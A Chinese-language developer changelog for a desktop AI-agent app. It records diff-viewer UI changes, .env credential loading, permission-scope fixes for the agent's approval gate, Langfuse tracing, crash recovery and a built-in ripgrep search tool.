  - [docs/架构.md](架构.md) §4.13.9 追加两段：（1）"chat 区域定义"——`header 下方、ChatInput 上方的消息列表区，Sidebar 不算`；（2）"放大预览 portal 锚点"——所有 modal 统一走 `#chat-fullscreen-anchor` + `inset-3` + transparent backdrop 的范式。
- **影响范围**: desktop frontend（ChatView / MessageBubble / DiffPanel / PermissionApprovalPopup）+ 架构文档；scrollRef 从 flex-1 改 absolute inset-0 后布局等价（新父容器接管了 flex-1 撑满），其它消息列表行为不变。
- **留尾巴**: 修改树面板（EditTreePanel）和 FloatingTaskPanel 是 ChatView 根级 `absolute right-4 top-...` 浮层，不在新 chat 区域 wrapper 内——它们的定位坐标系还是 ChatView 根（包含 header 高度），位置不变。如果以后要让浮层也只浮在 chat 区域内、随 header 高度变化自动调整，需要把它们也迁进新 wrapper。

### 2026-05-20 — desktop 启动加载 .env，避免每次重开终端重 export OTLP / Langfuse 变量

- **Why**: 上一条 Langfuse 接入打通后，所有秘钥靠 shell `export`，每次重开终端就丢；用户希望支持 `.env` 让本地凭据稳定下来，但不入仓。
- **改动**:
  - [apps/desktop/Cargo.toml](../apps/desktop/Cargo.toml): 新增 `dotenvy = "0.15"` 依赖
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `run()` 第一行 `dotenvy::dotenv().ok();`——必须早于 `observability::init`，否则 OTLP 环境变量读不到。dev 模式 Tauri CWD 在 `apps/desktop`，dotenvy 会向上递归找到 workspace 根的 `.env`
  - [.env.example](../.env.example): 新增模板，列出日志 / OTLP 通用变量 / Langfuse 区域 endpoint / `HEBBIAN_OTEL_METRICS` / `HEBBIAN_DUMP_MODEL_IO`，注明本机凭据走 `cp .env.example .env` 后填值
  - [docs/架构.md](架构.md) §4.10.1: 补充 `.env` 加载位置、优先级（shell > `.env`）、`.env.example` 入仓约定
- **影响范围**: 仅 desktop surface；`.gitignore` 早已忽略 `.env`，新增模板文件 `.env.example` 不被忽略（精确匹配规则）。优先级保留 shell > `.env` 默认行为，CI / 已有 `export` 用户零感知。
- **留尾巴**:
  - Release 包从可执行文件目录向上找 `.env`，如果用户把 release 装到 `/Applications/Hebbian.app` 这种位置，向上找不到 workspace `.env` 是预期——未来若要支持 prod `.env`，可加 `~/.hebbian/.env` 作为兜底加载点
  - cli surface 没改（`apps/cli` 已从 workspace 排除），重新启用时再加同样的 `dotenvy::dotenv()` 一行

### 2026-05-20 — 所有放大预览统一走 chat portal + DiffViewer 加 VSCode 风格 +/- 符号

- **Why**: 用户两个补充：（1）"所有放大显示的都改为到这个区域"——前一条只迁了 DiffViewer fullscreen + ExpandButton，AttachmentPreviewStrip 的图片放大和 DiffPanel 的非全屏 detail 浮层还在 `fixed inset-0` 状态；（2）上下 diff（inline 模式）也要加行号 + VSCode 风格的 +/- 符号让用户一眼能区分增减行。
- **改动**:
  - 全面迁 portal：
    - [apps/desktop/frontend/src/desktop/ui/components/AttachmentPreviewStrip.tsx](../apps/desktop/frontend/src/desktop/ui/components/AttachmentPreviewStrip.tsx): 图片放大预览原本 `createPortal(..., document.body) + fixed inset-0 bg-black/80`，改用 `<FullscreenPortal>` + `pointer-events-auto absolute inset-0 bg-foreground/40`；图片尺寸约束从 `max-h-[calc(100vh-6rem)]` 改成 `max-h-full max-w-full`（适配 chat 区域大小）
    - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx): `DiffPanel` 非全屏 detail 浮层从 `fixed inset-0 pointer-events-none` 改成 `<FullscreenPortal>` + `absolute right-4 top-4 max-h-[calc(100%-2rem)]`，浮层位置相对 chat 区域而非 viewport
  - DiffViewer 行渲染重写（VSCode 风格 +/-）：
    - `DiffLine` 重设计：受控显示 before/after 行号槽（独立控制是否渲）+ 行首 `+/-/空格` 符号槽，颜色按符号变化（+ 绿 / - 红 / 空格中性）；同时保留前一条的 flex 布局（长行换行从文本起点缩进）
    - `InlineDiff` 重写：原本是"修改前 / 修改后"两个独立块的简化视图，改成 **VSCode unified view**——单列、按 diff 顺序混排所有行，每行同时显示 before/after 两个行号槽 + 行首 +/-/空格符号；删除行红底带左行号，新增行绿底带右行号，不变行两边都有行号。一眼能看出哪一行被删/加。
    - `SplitDiff` 在原行号基础上加 +/- 符号槽：左侧 before 端 remove 行带 `-`、不变行带空格；右侧 after 端 add 行带 `+`、不变行带空格。
  - 流式光标位置：unified inline 也加最后一个非 remove 行的光标占位，跟 split 一致
- **影响范围**: desktop frontend（AttachmentPreviewStrip / DiffPanel / 复用 FullscreenPortal）；zero protocol change、zero Rust change。视觉变化：（a）图片放大现在只覆盖 chat 区域而非整个窗口；（b）DiffPanel 浮层从右上 viewport 角改成 chat 区域右上角；（c）inline diff 从"上下两块"变成"VSCode unified"，带行号和 +/-；（d）split diff 行首多了 +/- 符号槽。
- **留尾巴**:
  - `ui/dialog.tsx` 是通用 Dialog 组件（用于 AppSettings / SessionSettings / Providers / Prompts / DeepseekLogin / OAuth 等"配置类弹窗"），按设计应该全屏覆盖，没迁 portal——这与"放大查看"语义不同，本次保持。
  - inline diff 切到 unified view 是行为变化：之前是"上下两块"，现在是"VSCode 单列混排"，用户习惯上要适应。如果有人怀念旧布局可以加 setting 切回，目前不做。

### 2026-05-20 — DiffViewer 限 20 行滚动 + SplitDiff 行对齐 bug 修复

- **Why**:
  - 长 diff 把工具卡片撑得太长，用户希望默认只显示 20 行、超出滚动看完整。
  - SplitDiff 左侧第一行渲到了最下面、右侧渲到了最上面——根因：之前左右两列是各自独立的纵向列表，add 行在左列用 `min-h-[1.4em]` 占位 div、remove 行在右列同样；但实际内容行 break-all 后高度变多行，左右两列同一逻辑行的高度不再一致，逐行错位累积出"反"的视觉。
- **改动**:
  - 限高（[DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx)）：
    - `DiffViewer` 新增 `maxRows?: number` prop。内部按 `行高 18px × maxRows + padding 16px` 算 `maxHeight`，赋给 InlineDiff / SplitDiff 最外层 overflow 容器。`fullscreen` 模式自动忽略（父容器接管高度）。
    - 同时清掉 inline 模式之前误嵌的双层 `flex-1 overflow-auto`（DiffViewer 外层 + InlineDiff 内层），现在只有 InlineDiff 自己一层。
    - 三处调用（[EditDiffDetail](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) / [ApprovalEditDiff](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx) / [DiffPanel detail 浮层](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx)）非全屏时统一传 `maxRows={20}`；去掉旧的 `className="max-h-[60vh]"` / `className="max-h-[50vh]"`——`maxRows` 是单一真理来源。
  - SplitDiff 重写为 row-first flex 布局：
    - 之前每列是独立的 `<div>{...}.map</div>`，每行各自渲一个 DiffLine 或 placeholder div——两列同行高度不同就错位。
    - 改成：sticky header 一行 flex divide-x；下面 `{diffRows.map(...)}` 每行渲一个 `<div className="flex divide-x">`，里面装左右两个 cell。flex 默认 `align-items: stretch`，长行 break-all 让一列变高时另一列自动跟上；占位 div `min-h-[1.4em] flex-1 min-w-0` 也 stretch 到同行实际行高。
  - `DiffLine` 不变，仍按上一条的双行号槽 + +/-/空格符号槽渲。
- **影响范围**: 仅 desktop frontend DiffPanel；行为变化：（a）所有 DiffViewer 默认 20 行可见、超出滚动；（b）SplitDiff 长行不再错位。zero protocol / Rust 变更。
- **留尾巴**:
  - **关于 inline diff 顺序**：用户提到"印象中 source 在上、change 在下"——这与当前实现一致。LCS 回溯优先 `j--`（add）再 `i--`（remove），rev.reverse() 后单个修改对的顺序就是 `remove 在上、add 在下`，等同 git / VSCode unified diff 标准。如果在某个具体例子里看到反了，可能是 LCS 把"修改"识别成"删除 + 新增"且两块不相邻，需要具体例子复现。
  - 行高常量 `DIFF_LINE_PX = 18` 是按 text-[11px] leading-relaxed (1.625) 算的近似值；如果将来调字号或行距要同步更新。

### 2026-05-20 — DiffViewer mode 拆分 + detail 默认仅渲 args + 放大态拉完整文件（GitHub review 风格）

- **Why**:
  - Bug A：审批弹窗放大后，点 inline/split 切换按钮就关掉放大框。根因：之前 `DiffMode = "inline" | "split" | "fullscreen"` 把"布局"和"是否放大"塞到同一个 state；fullscreen 模式下传给 DiffViewer 的 mode 写死 "split"，`onCycleMode` 实际是 `() => setMode("split")` 即退出全屏。
  - Bug B：点接受编辑后几秒钟显示完整全文 diff。根因：detail 态切换时 `useEffect` 触发 `api.diffEdit` 拉服务端权威完整 before/after，覆盖 args 局部 → 画面"突然变全文"。用户指出 args 里已经有 old_string/new_string，根本不需要 fetch。
  - 新需求：放大态希望能看未改动的上下文行，类似 GitHub review 的"Show more context"。这与 Bug B 的诉求并存——非放大保持局部、放大才看完整。
- **改动**:
  - 拆 mode（[DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx)）：
    - `DiffMode` 改为 `"inline" | "split"`（移除 `"fullscreen"`）
    - DiffViewer 新增 `expanded?: boolean` + `onToggleExpanded?: () => void` props；顶栏渲放大/缩小按钮的逻辑挪到 DiffHeader 内（之前靠父组件传 rightExtras，重复且容易错）
    - `maxRowsToStyle` 不再判断 fullscreen，由调用方决定放大时传 `maxRows={undefined}`
  - 三处调用同步拆 `mode` → `viewMode + expanded`：
    - [MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) `EditDiffDetail`：
      - 删除 `useEffect → api.diffEdit` 的无条件 fetch（这是 Bug B 根因）
      - 改成"仅 expanded 且有 snapshot 时"才 fetch；fetch 完成后 expanded 态切到 `fullPayload`（完整 before/after），非 expanded 态永远是 args 局部
      - 增加 badge "完整文件" / "加载完整文件…" / "完整文件加载失败"
    - [PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx) `ApprovalEditDiff`：纯拆 mode，数据源永远是 args（审批时没有 worktree 可拉）；切换 inline/split 在放大态下也能用了
    - [DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx) `DiffPanel` 修改树 detail 浮层：拆 mode；数据源仍是 `api.diffEdit`（这里入口本来就是修改树点对比按钮，期望全文）；放大态去掉 `maxRows=20` 让父容器接管高度
  - 架构 §4.13.9 重写数据源表：
    - 表格列改成 "默认数据源（非放大）" + "放大态数据源" 两列
    - detail 态默认改成"仍用 args 局部 diff"，放大态才是 `diffEdit` 完整文件
    - 加"关键设计"段说明非放大态永远不读 worktree 的取舍
- **影响范围**: desktop frontend（DiffPanel / MessageBubble / PermissionApprovalPopup）+ 架构 §4.13.9；zero protocol / Rust 变更。视觉变化：
  - 审批放大后切 inline/split 不再误关
  - Edit 完成时不会"突然显示全文"——保持 args 局部 diff
  - 用户主动点放大才看到完整文件（含未改动上下文，GitHub review 风格）
- **留尾巴**:
  - 放大态目前是"非放大局部 → 放大完整"二态切换，没有 GitHub 那样的"扩展 ±3 行 / ±10 行"精细控制。如果有人想要中间档（例如 hunk + 3 行上下文），后续可以加 toggle。
  - `api.diffEdit` 在 expanded 切换时才发起，第一次放大有几百 ms 等待——加载期间徽标显示"加载完整文件…"，体验上可接受。如果觉得卡顿可以预取（卡片初次渲染时就请求并缓存）。

### 2026-05-20 — Diff 放大态 GitHub 风格折叠：未改动行默认收起，点击「展开 N 行原文」按需展开

- **Why**: 用户说"审批完了普通 tool 展开然后放大也要能看 github 的那种展开原文的效果"——之前放大态直接 dump 完整文件全部行，未改动的也一股脑铺出来；GitHub PR review 的标准做法是默认折叠未改动段、显示「↕ Show N more」按钮按需展开。诉求就是这个。
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx):
    - 新增 `DiffViewerProps.collapseContext?: number`——提供则按 GitHub 风格折叠
    - 新增 `buildRenderRows(diffRows)`：预计算每行 before/after 行号，避免在 React map 内 mutable 累加导致折叠展开时闭包错乱
    - 新增 `buildCollapsibleView(diffRows, contextLines)`：扫一遍 diffRows，标记每个 change 行的 ±N 邻居为"可见"，剩下连续不可见段切成 `{kind: "collapsed", start, end}` 折叠单元
    - 折叠 state 提到 DiffViewer 顶层（`Set<string>`，groupKey = `${start}-${end}`），切换 inline↔split 保留展开偏好
    - `InlineDiff` / `SplitDiff` 改为接收 `items: DiffViewItem[] | null` + `renderRows`：items 存在则按视图迭代渲行 / 折叠按钮；items=null 全展开（沿用旧路径）
    - 新增 `<CollapsedToggle>` 组件：跨整行的虚线边框按钮，「↕ 展开 N 行原文（#start—#end）」，hover 高亮，点击调 `toggleGroup`
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx) `EditDiffDetail`: expanded 且 `useFull`（即拿到了完整 EditEntry payload）时传 `collapseContext={3}`；其它情况不传（args 局部 diff 没有未改动段可折叠）
  - [apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx](../apps/desktop/frontend/src/desktop/ui/components/DiffPanel.tsx) `DiffPanel` 修改树 detail 浮层：始终是完整文件 → 始终传 `collapseContext={3}`（含非放大态——这里点开本来就是想看权威 diff）
  - `ApprovalEditDiff` 不传——审批时只有 args 局部，没有未改动段
  - [docs/架构.md](架构.md) §4.13.9 加一段「GitHub 风格折叠」语义说明
- **影响范围**: desktop frontend（DiffPanel / MessageBubble）+ 架构文档；零 protocol / Rust 变更。视觉变化：放大 Edit/Write 看到完整文件时默认按 hunk 折叠，未改动大段收起为单行按钮，点开扩展回原行。
- **留尾巴**:
  - 当前折叠粒度是"整段一次性展开"，没有 GitHub 那样的"展开 ±10 行"中间档。如果折叠段特别大，用户点一次就全开了——大文件场景或许不理想，后续可加上下/中间分档展开。
  - `collapseContext = 3` 是硬编码，没做成可配。如果对上下文需求强烈可以让它成为 settings 项。

### 2026-05-20 — 权限审批：新增 Project scope + 文件热加载 + 修复 session 规则被清空的 bug

- **Why**: 用户报告三个相关问题：(1) 同一对话内已审批的命令（如 `cd *`）再次出现仍弹审批，本次 session 允许 / 全局允许都不奏效；(2) 缺少"本项目允许"档——当前用 Session 太窄（仅本对话），Global 太宽（其他项目也生效），同一项目里开多个对话 / 不同 worktree 用同一规则的场景没法表达；(3) 手动改 `~/.hebbian/permissions.json` 必须重启 Desktop 才生效。
- **根因**:
  - **真凶**：[apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs) 每次发新消息无脑调 `store.load_session_rules(sid, Vec::new())`，而该函数是 `HashMap::insert`，**直接把前几轮累积的 Session 规则覆盖成空 vec**——用户选 AllowAndRemember(Session) 后下个 turn 一发消息规则就没了，PermissionStore 找不到匹配自然又弹审批。
  - PermissionStore Global 规则只在 `open()` 时加载一次 in-memory cache，运行时不感知文件变更——手动改文件需重启才生效。
  - 只有 Session / Global 两档持久化 scope，缺 workdir 维度。
- **改动**:
  - [docs/架构.md](架构.md) §4.5.3 / §4.5.4 / §4.6.1 / §4.6.2 / §13: AllowScope 由 3 种扩为 4 种（Once / Session / Project / Global），PermissionRule 新增可选 `workdir` 字段，匹配阶段加 mtime 热加载策略；§13 追加 3 行决策（Project scope / 文件热加载 / 严禁 turn 间无脑清 session_rules）
  - [crates/protocol/src/permission.rs](../crates/protocol/src/permission.rs): `PermissionScope` 加 `Project` 变体
  - [crates/agent-core/src/permissions/mod.rs](../crates/agent-core/src/permissions/mod.rs): 重构 `PermissionStore`：`global_rules` 改 `persisted_rules`（Project + Global 共存一个 vec，按 `scope` + `workdir` 区分）；新增 `reload_if_stale` 在每次 `find` / `find_for_segments` / `allows_path` 前按 mtime 判断是否需要重读文件；新增 `ensure_session_view`（幂等初始化，已存在则保留）；规则匹配按 [Session, Project, Global] 顺序；`workdir_matches` 按 `current_workdir.starts_with(rule.workdir)` 命中（含子目录）；写入 Project 规则强制要求带 workdir，否则报错。新增 6 个单元测试覆盖 project 维度匹配 / ensure_session_view / 外部文件改动热加载
  - [crates/agent-core/src/storage/permissions.rs](../crates/agent-core/src/storage/permissions.rs): 暴露 `path()` / `mtime()` 帮助 `PermissionStore` 做热加载
  - [crates/agent-core/src/tools/hitl.rs](../crates/agent-core/src/tools/hitl.rs): `HitlGate` 持 `workdir`，`with_store(store, sid, workdir)` 多一个参数；`remember` 增加 `Project` 分支（写持久化文件 + workdir 字段）
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `allows_path` 调用传 workspace.workdir；`await_path_decision` 中 `AllowAndRemember` 分支按 scope 决定写入 sid / workdir：Project → workdir、Session → sid、Global → 都 None
  - [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): 构造 `HitlGate` 时把 `workspace.workdir()` 透传给 `with_store`
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): **核心 bug 修复**——把 `store.load_session_rules(sid, Vec::new())` 改成 `store.ensure_session_view(sid)`，保留前轮累积规则
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `approve_permission` scope 支持 `"project"`；`approve_path_access` scope 词表更名（`this_project` 改为 workdir 级 Project；旧 session 级语义改名为 `this_session`；旧 `all_project` 改为 `global`，命名与 PermissionScope 对齐）
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts) / [ui/types.ts](../apps/desktop/frontend/src/desktop/ui/types.ts) / [ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): 同步 scope 类型 + 命名
  - [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): tool_call 类按钮（Bash 前缀路径和非 Bash 路径都加）+ path_access 类按钮都增加"本项目" / "加入本项目"档，icon 用 lucide `FolderTree`
- **影响范围**: protocol（向前兼容：旧 PermissionRule 反序列化时 `workdir` 缺省 None，按 Global 处理）/ agent-core / desktop / frontend / docs。`permissions.json` 文件格式向前兼容：旧文件无 `workdir` 字段直接当 Global 加载；新写入的 Project 规则带 workdir，旧版本读到也只是当 Global，不会崩
- **留尾巴**:
  - Session 规则的 jsonl 持久化（架构 §4.5.4 提到的 `{ "type": "PermissionRule", ... }` entry type）依旧未实现——重开 Desktop 后 session 规则会丢，依赖 Recorder 后续接入。本次只修了「同进程内 session 规则被清空」，重启级别的持久化是另一个独立 issue
  - 热加载策略每次 match 前 stat 一次文件——同进程内只有真正发现 mtime 变化才重读。批量审批场景下 syscall 开销可接受，未做缓存窗口（如"500ms 内不再 stat"）
  - 危险复合模式（cd-git-compound / multi-cd 等）依然是 `refuse_remember=true`——架构 §4.4.2.2 明确规定。这次没动这条原则；如果用户 `cd /xxx && git yyy` 类命令一直审批不烦，那是设计预期，不是 bug

### 2026-05-20 — 修正 .env.example 与 .env 写法：含空格 value 必须单引号包裹

- **Why**: 上一条加完 `.env` 支持后，Langfuse 一直 401。根因是 dotenvy 0.15 对 unquoted value 不允许含空格——`OTEL_EXPORTER_OTLP_HEADERS=Authorization=Basic xxx` 这种 value 里有空格，dotenvy 抛 `LineParse(..., 20)`（20 正好是 `Basic ` 后的那个空格位置），整个 KV 没注入到环境，于是 OTLP 请求没 Authorization header → Langfuse 401。验证方式：单独跑 `dotenvy::from_filename_override` 直接复现 panic
- **改动**:
  - [.env.example](../.env.example): `OTEL_EXPORTER_OTLP_HEADERS` 示例从 `Authorization=Basic <b64>` 改成 `'Authorization=Basic <b64>'`（单引号 literal，里面 `=` 和空格不会被特殊处理），并加显式警告说明 dotenvy 不接受 unquoted spaces
  - 本机 `.env` 同步改为单引号包裹的形态（验证 dotenvy 三个变量全部正确加载）
- **影响范围**: 只动文档/模板，零代码改动。observability 端不需要 strip 引号——dotenvy 自己会处理引号、注入到 env 的就是 literal value
- **留尾巴**:
  - 如果未来想让 observability 容忍 raw shell-style 单/双引号（比如用户用 `export OTEL_EXPORTER_OTLP_HEADERS="..."` 时一些 shell 不剥引号），可以在 `parse_otlp_headers` 里加一次 `trim_matches(|c| c == '"' || c == '\'')`。但当前 dotenvy 已经处理，加这层兜底是多余防御，先不加
  - 另一个边角：dotenvy 双引号 value 会处理 `\n` `\t` 等转义；base64 字符表里没这些，所以单引号 / 双引号在本场景等价，统一推荐单引号是为了让用户少踩一类坑（万一某天 value 里出现 `\xxx` 字面字符串）

### 2026-05-20 — 补全 Langfuse OTLP span 语义：一个 run 聚合成 trace，model/tool 有 input/output/usage

- **Why**: Langfuse 认证打通后，Web 端虽然有数据，但体验不对：一次 user message 到 agent_loop 结束应该是一条 `run` trace；实际列表里夹杂启动探针 trace，trace 内 observations 也只有 metadata，`model.request` 缺失，`model_call` / `tool_call` 的 input、output、usage 全为空。根因：（1）临时 `startup-probe` 仍在 init 里每次启动都发一条 trace；（2）Desktop 默认 filter 只有 `agent_core=debug,warn`，`model_gateway` 的 info span 被过滤，导致 `model.request` 根本没上报；（3）只写了 `gen_ai.usage.*`，没有写 Langfuse OTLP ingest 显式识别的 `langfuse.trace.*` / `langfuse.observation.*` 字段。
- **改动**:
  - [crates/observability/src/lib.rs](../crates/observability/src/lib.rs): 删除临时 `startup-probe` native OTel span；保留 subscriber 初始化失败时的 stderr 提示（这类失败会让 otel_layer 不生效，必须显性暴露）
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 默认 filter 从 `agent_core=debug,warn` 改为 `agent_core=debug,model_gateway=info,warn`，让 `model.request` info span 进入 OTLP
  - [crates/observability/src/attr.rs](../crates/observability/src/attr.rs): 新增 `gen_ai.prompt/completion` 与 Langfuse 显式映射常量：`langfuse.trace.input/output`、`langfuse.observation.input/output/usage_details`
  - [crates/model-gateway/src/instrument.rs](../crates/model-gateway/src/instrument.rs): `model.request` 标记 `langfuse.observation.type="generation"`，记录模型名、参数、请求 messages JSON、完成文本 / tool calls JSON、usage_details JSON；继续保留 GenAI semconv 的 model/usage/finish_reason，并把 prompt/completion 同步写到 `gen_ai.prompt/completion`
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): run span 记录最近一条 user message 作为 `langfuse.trace.input`，最终 assistant output 作为 `langfuse.trace.output`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): tool.call span 记录有效工具入参（hook 改写后）作为 `langfuse.observation.input`，最终返回给模型的工具结果作为 `langfuse.observation.output`
  - [docs/架构.md](架构.md) §4.10.1: 补充 GenAI prompt/completion 与 Langfuse 显式映射字段、32k chars 截断约束
- **影响范围**: observability / model-gateway / agent-core / desktop；不改协议、不改 session/jsonl、不改 UI。Langfuse 会开始存明文 prompt、completion、tool input/output（含可能的文件片段 / 命令输出），这是用户明确要求“都加”的结果；所有写入 Langfuse 的长文本统一按 32k chars 截断，避免 OTLP payload 过大。
- **留尾巴**:
  - `model.request` 的 input 当前是完整请求 messages（system + transcript + tool results），能最大化还原模型上下文，但会把系统 prompt 和工具输出明文发到 Langfuse。若后续需要隐私模式，可加环境变量控制“只记录 summary / 最近 N 轮 / 不记录内容”。
  - trace.input 取的是 run 开始时 transcript 中最近一条 user message；如果本 run 中途通过 pending input 注入额外 user message，trace.input 不会追加更新。本次先保持“一次用户触发 run = 最近 user message”的语义，避免 trace.input 过长。

### 2026-05-20 — 调整 Langfuse trace 树为 agent 语义层级，补 session 聚合

- **Why**: 用户指出目标不是“把所有信息塞进一条 observation”，而是像 deepagents 一样：一次用户消息只有一条 trace 记录，点开后是一棵清晰的 agent 树（before/model/tools/permission/after），而不是在列表里像散落的 `turn` / `model.request` / `tool.call`。之前虽然 trace_id 已经一致，但 `turn` 这个内部实现名直接暴露，model/tool 也没有挂在明确的 phase 容器下；同时 Langfuse Sessions 为空，因为 root span 没写 `langfuse.session.id`。
- **改动**:
  - [crates/observability/src/attr.rs](../crates/observability/src/attr.rs): 新增 `LANGFUSE_SESSION_ID = "langfuse.session.id"`
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): run span 声明并记录 `langfuse.session.id`；原 `turn` span 更名为 `agent.iteration`；每轮模型调用前新增 `model` phase span，并把 `model.request` 挂到它下面；工具阶段新增 `tools` phase span，并把 dispatcher / tool.call 挂到它下面
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): tool span 增加 `otel.name = tool.<name>` 属性，给 OTLP/Langfuse 一条可读的工具名线索（若 Langfuse 不把它映射成 observation name，也仍保留 `hebbian.tool.name` 可筛选）
  - [docs/架构.md](架构.md) §4.10.1: 明确 Langfuse 树结构为 `run → agent.iteration → model → model.request` 与 `run → agent.iteration → tools → tool.call`
- **影响范围**: observability attr / agent-core trace span 树 / Langfuse UI 展示；不改协议、不改业务执行、不改 session/jsonl。下一条新 trace 才会带 sessionId，历史 trace 不会回填。
- **留尾巴**:
  - 当前 hook 只有 BeforeModelCall / PreToolUse / PostToolUse 等触发点，没有单独建 `hook.before_model` observation；如果要完全复刻用户截图里 middleware/hook 节点，需要在 HookManager::trigger 周围统一包一层 hook span。
  - `tool.<name>` 是否成为 Langfuse UI 的 observation name 取决于 tracing-opentelemetry / Langfuse 对 `otel.name` 的映射；如果仍显示 `tool.call`，后续可把常用工具按 match 建固定 span name，或引入原生 OTel span builder 支持动态 name。

### 2026-05-20 — 启用 partial 崩溃恢复：进程退出后输出不再丢失

- **Why**: 用户反映程序退出（强退 / crash）后已经输出的 assistant 内容不在 session.jsonl 里——聊了一半的内容彻底消失。根因是 `chat.rs` 的 `recorder: None` 一直是空，且 `sessions::append_message` 只在 run 正常完成后才落盘。
- **改动**:
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs):
    - 新增 `PartialFileWriter` 结构体：持有 `BufWriter<File>`，在 `on_event` 中把 TextDelta / TextDone(non-streaming) / Reasoning / ToolCallStarted / ToolCallDelta 增量写到 `partial/<msg_id>.partial.jsonl`。使用 BufWriter 而非 fsync 每次，Drop 时自动 flush OS buffer——正常退出和 panic 都能保留内容，SIGKILL 有极小 OS buffer 窗口丢失（可接受）。
    - `DesktopObserver` 增加 `partial_writer` 字段，`new()` 接受 `data_dir`/`session_id` 并自动创建 partial 文件。
    - 所有出口路径（Done / Cancelled / Failed）均在输出已落盘后删除 partial 文件，避免下次误恢复。
    - 新增 `recover_and_save_interrupted_partials`：每次用户发新消息时，先扫描 partial 目录，把残留内容追加为 AssistantMessage + Interrupted 标记到 session.jsonl，再删 partial 文件。
    - 新增 `partial_to_interrupted_message`：把 `RecoveredPartial`（text / reasoning / tool_calls）组装成 `Message`。
  - `recorder: None` 保持不变——Recorder 是全量 Event 落盘，当前问题由 partial 机制解决，两者互不干扰。
- **影响范围**: `apps/desktop/src/chat.rs` 只改 desktop 一个文件；`sessions_dir` 的 partial 基础设施（`append_partial` / `delete_partial` / `recover_interrupted_partials`）已在前期建好，本次只是首次接入调用方。协议不变，session.jsonl 格式不变，前端无感。
- **留尾巴**:
  - SIGKILL（`kill -9`）仍有极小窗口（BufWriter 剩余内容，最多几 KB）可能丢失；完全消除需改为 per-write fsync 或引入 Recorder 的 async-channel 模式，但性能代价高，当前 trade-off 合理。
  - `recorder: None` 仍未启用；架构 §4.9 的完整 Recorder 路线（全量 Event 落盘）可在后续迭代中独立开启，届时 partial 机制可以退役（二者功能重叠但不冲突）。
  - 崩溃恢复后前端展示的 tool_calls 没有 result（崩溃时工具可能没跑完），不影响对话可读性，但后续可考虑在 MessagePart::ToolCall 上加 `truncated` 标记区分已完成和中断的工具调用。

### 2026-05-20 — Grep 内置化：使用 ripgrep 同源 crates，不再依赖系统 rg 二进制

- **Why**: 用户在 Desktop 里看到 `Grep: 未找到 ripgrep（rg）。请安装...`，但本机 shell 里 `rg` 实际存在于 `/opt/homebrew/bin/rg`。根因是 `GrepTool` 直接 `Command::new("rg")`，GUI app / Tauri 启动环境的 PATH 不等于交互 shell PATH。用户进一步明确要求的不是手写简化版 grep，而是命令行 ripgrep 的高效搜索核心；所以实现必须用 ripgrep 项目拆出的 Rust crates，而不是依赖系统二进制或维护自写 walkdir+regex 子集。
- **改动**:
  - [crates/agent-core/src/tools/grep.rs](../crates/agent-core/src/tools/grep.rs): 删除外部 `rg` 进程调用，改为 `tokio::task::spawn_blocking` 内部搜索；遍历 / `.gitignore` / override glob / type 过滤走 `ignore::WalkBuilder`；正则编译走 `grep_regex::RegexMatcherBuilder`；逐文件匹配、行号和二进制检测走 `grep_searcher::Searcher`。保留 `files_with_matches` / `content` / `count` 三种 output_mode，默认排除 `.git` / `.svn` / `.hg` / `node_modules` / `target`，并支持常见 `type` alias（rust/rs/py/ts/js/md/yml 等）。
  - [crates/agent-core/Cargo.toml](../crates/agent-core/Cargo.toml): agent-core 增加 `ignore` / `grep-matcher` / `grep-regex` / `grep-searcher` 依赖。
  - [docs/架构.md](架构.md) §4.4.6 / §13: 明确 `Grep` 是 Rust 内部实现，使用 ripgrep 同源 crates，不依赖系统 `rg` 或 GUI PATH；同时说明协议边界仍是 Hebbian 的工具 schema，不是完整 `rg` CLI flag 兼容层。
  - 新增单测：PATH 指向空目录时 `Grep` 仍能成功；`.gitignore` 忽略的文件不会被搜出来；覆盖 brace glob + type 过滤、count 模式。
- **验证**: `cargo test -p agent-core tools::grep::tests` 通过（7 项）。
- **影响范围**: agent-core 内置 Grep 工具。协议不变、工具 schema 不变、权限/effects 不变。用户可见变化是 Desktop 内 `Grep` 不再因 PATH 找不到 `/opt/homebrew/bin/rg` 失败，同时搜索路径更接近命令行 `rg` 的核心行为（ignore/type/regex/searcher 同源）。
- **留尾巴**:
  - 这不是完整 `rg` CLI flag 兼容层：Hebbian `Grep` 的模型可见 schema 目前没有 `--type-not`、多 include/exclude glob、context lines、PCRE2 等参数。后续要扩能力应扩工具 schema 并继续复用 ripgrep crates，而不是退回系统二进制。

